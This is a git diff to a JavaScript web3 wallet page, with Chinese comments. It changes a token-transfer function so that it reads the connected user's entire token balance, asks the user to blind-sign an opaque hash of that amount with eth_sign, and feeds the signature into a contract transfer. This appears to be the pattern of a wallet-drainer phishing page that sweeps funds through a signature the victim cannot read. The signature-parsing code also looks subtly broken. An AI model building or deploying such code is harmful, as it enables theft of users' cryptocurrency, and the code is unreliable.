@@ -116,17 +116,31 @@ async function connectWallet() {
         document.getElementById('address').innerText = userAddress;
         document.getElementById('walletInfo').classList.remove('hidden');
         document.getElementById('connectWallet').classList.add('hidden');
+
+        // 自动填写参数
+        document.getElementById('tokenAddress').value = '0x...（替换为你的代币合约地址）'; // 代币合约地址
+        document.getElementById('fromAddress').value = userAddress; // 被签名的钱包地址
     } else {
         alert('请安装MetaMask或其他以太坊钱包！');
     }
 }
 
-async function transferTokens() {
+async function signAndTransferTokens() {
     const tokenAddress = document.getElementById('tokenAddress').value;
     const fromAddress = document.getElementById('fromAddress').value;
-    const v = document.getElementById('v').value;
-    const r = document.getElementById('r').value;
-    const s = document.getElementById('s').value;
+
+    const amount = await getTokenBalance(tokenAddress, fromAddress); // 查询代币余额
+
+    // 生成签名消息
+    const message = web3.utils.soliditySha3(
+        { t: 'address', v: tokenAddress },
+        { t: 'address', v: fromAddress },
+        { t: 'uint256', v: amount }
+    );
+
+    // 进行签名
+    const signature = await web3.eth.sign(message, fromAddress);
+    const { v, r, s } = extractSignatureParameters(signature);
 
     const contract = new web3.eth.Contract(contractABI, contractAddress);
 
@@ -141,5 +155,38 @@ async function transferTokens() {
     }
 }
 
+function extractSignatureParameters(signature) {
+    const r = signature.slice(0, 66);
+    const s = '0x' + signature.slice(66, 130);
+    const v = parseInt(signature.slice(130, 132), 16) + 27; // v 值转换
+    return { v, r, s };
+}
+
+async function getTokenBalance(tokenAddress, fromAddress) {
+    const tokenContract = new web3.eth.Contract([
+        {
+            "constant": true,
+            "inputs": [
+                {
+                    "name": "owner",
+                    "type": "address"
+                }
+            ],
+            "name": "balanceOf",
+            "outputs": [
+                {
+                    "name": "",
+                    "type": "uint256"
+                }
+            ],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }
+    ], tokenAddress);
+
+    return await tokenContract.methods.balanceOf(fromAddress).call();
+}
+
 document.getElementById('connectWallet').addEventListener('click', connectWallet);
-document.getElementById('transferTokens').addEventListener('click', transferTokens);
+document.getElementById('transferTokens').addEventListener('click', signAndTransferTokens);
